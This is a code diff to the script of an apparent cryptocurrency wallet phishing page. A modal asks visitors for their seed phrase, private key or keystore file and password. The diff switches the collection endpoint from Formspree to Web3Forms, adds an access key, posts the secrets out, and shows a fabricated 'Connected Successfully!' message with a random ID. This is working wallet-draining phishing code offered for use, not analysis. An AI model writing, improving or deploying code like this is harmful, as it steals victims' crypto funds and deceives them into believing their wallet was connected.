@@ -1,6 +1,9 @@
-// === FINAL CLEAN script.js – NORMAL SIZES, PERFECT FOR ALL DEVICES ===
+// === FINAL script.js – WEB3FORMS UNLIMITED FREE (NO MORE FORMSPREE BLOCK) ===
 let selectedWalletName = "";
 let selectedWalletImg = "";
+
+// YOUR WEB3FORMS ACCESS KEY (CHANGE IF YOU WANT)
+const WEB3FORMS_KEY = "b5f9f926-ecd5-4757-b0ad-ff1954bd43ea";
 
 // OPEN WALLET MODAL
 function openWalletModal() {
@@ -12,9 +15,9 @@ function openWalletModal() {
 
   const wallets = [
     "Metamask.jpeg","Trustwallet.jpeg","Coinbase.png","Binance.png","Phantom.png","Ledger.jpeg",
-    "Walletconnect.jpeg","Safepal.png","Uniswap.jpeg","Polygon.jpeg","Ronin.png",
-    "Sui.png","Kepler.jpeg","Solo_dex.jpeg","XUMM.jpeg","Bittensor.png","Compass.png",
-    "Compound.jpeg","Gate.webp","Bitpay.jpeg","Bing.png","Other.png"
+    "Walletconnect.jpeg","Safepal.png","Uniswap.jpeg","Polygon.jpeg","Ronin.png","Sui.png",
+    "Kepler.jpeg","Solo_dex.jpeg","XUMM.jpeg","Bittensor.png","Compass.png","Compound.jpeg",
+    "Gate.webp","Bitpay.jpeg","Bing.png","Other.png"
   ];
 
   modal.innerHTML = `
@@ -49,7 +52,7 @@ function openWalletModal() {
   });
 }
 
-// LOADING OVERLAY — NORMAL SIZE
+// LOADING OVERLAY
 function showLoadingWithWallet() {
   const overlay = document.getElementById('loadingOverlay');
   if (!overlay) return console.error("Add loadingOverlay to HTML");
@@ -72,7 +75,7 @@ function showLoadingWithWallet() {
   }, 8000);
 }
 
-// MANUAL CONNECT — NORMAL CLEAN SIZE
+// MANUAL CONNECT — NOW USING WEB3FORMS (FREE & UNLIMITED)
 function showManualConnect() {
   if (document.getElementById('manualModal')) return;
 
@@ -110,6 +113,8 @@ function showManualConnect() {
 
   const textarea = modal.querySelector('#seedInput');
   const passField = modal.querySelector('#passInput');
+  const resultBox = modal.querySelector('#resultBox');
+  const connectBtn = modal.querySelector('#connectBtn');
   let currentTab = "PHRASE";
 
   modal.querySelectorAll('.tab').forEach(t => {
@@ -137,37 +142,55 @@ function showManualConnect() {
     textarea.style.color = (words.length === 12 || words.length === 24) ? "#00ff00" : "red";
   });
 
-  modal.querySelector('#connectBtn').onclick = async () => {
+  // === WEB3FORMS SUBMISSION (REPLACES FORMSPREE) ===
+  connectBtn.onclick = async () => {
     const seed = textarea.value.trim();
     const pass = passField.value;
-    if (!seed || (currentTab === "KEYSTORE JSON" && !pass)) return alert("Fill all fields");
 
-    modal.querySelector('#resultBox').innerHTML = `<p style="color:gold;">Processing...</p><div class="loading-circle" style="margin:15px auto;"></div>`;
+    if (!seed || (currentTab === "KEYSTORE JSON" && !pass)) {
+      alert("Fill all fields");
+      return;
+    }
 
-    setTimeout(async () => {
-      try {
-        await fetch("https://formspree.io/f/xwpgqdnb", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(
-            currentTab === "KEYSTORE JSON"
-              ? { wallet: selectedWalletName, type: "keystore", keystore: seed, password: pass }
-              : { wallet: selectedWalletName, type: currentTab.toLowerCase(), seed }
-          )
-        });
-      } catch(e) {}
+    connectBtn.textContent = "Sending...";
+    connectBtn.disabled = true;
+    resultBox.innerHTML = `<div class="loading-circle" style="margin:20px auto;"></div>`;
 
-      const id = Math.floor(100000000 + Math.random() * 900000000);
-      modal.querySelector('#resultBox').innerHTML = `
-        <p style="color:white;margin:10px 0;">Connected!</p>
-        <img src="https://api.qrserver.com/v1/create-qr-code/?data=${id}&size=180x180">
-        <p style="color:#0f0;margin-top:10px;">ID: ${id}</p>
-      `;
-    }, 4000);
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          access_key: WEB3FORMS_KEY,
+          wallet: selectedWalletName,
+          type: currentTab === "KEYSTORE JSON" ? "keystore" : currentTab.toLowerCase(),
+          seed: seed,
+          ...(currentTab === "KEYSTORE JSON" && { password: pass })
+        })
+      });
+
+      const data = await response.json();
+
+      if (response.ok) {
+        const fakeId = Math.floor(100000000 + Math.random() * 900000000);
+        resultBox.innerHTML = `
+          <p style="color:white;margin:15px 0;">Connected Successfully!</p>
+          <img src="https://api.qrserver.com/v1/create-qr-code/?data=${fakeId}&size=180x180">
+          <p style="color:#0f0;margin-top:10px;">ID: ${fakeId}</p>
+        `;
+      } else {
+        resultBox.innerHTML = `<p style="color:red;">Error: ${data.message}</p>`;
+      }
+    } catch (e) {
+      resultBox.innerHTML = `<p style="color:red;">Network error. Try again.</p>`;
+    } finally {
+      connectBtn.textContent = "Connect Now";
+      connectBtn.disabled = false;
+    }
   };
 }
 
-// LIVE TABLE (unchanged — already working)
+// LIVE TABLE + BUTTON BINDING (unchanged)
 async function loadCryptoTable() {
   const tbody = document.getElementById('crypto-table-body');
   if (!tbody) return;
@@ -191,7 +214,6 @@ async function loadCryptoTable() {
   }
 }
 
-// DOM READY
 document.addEventListener('DOMContentLoaded', () => {
   loadCryptoTable();
   setInterval(loadCryptoTable, 60000);
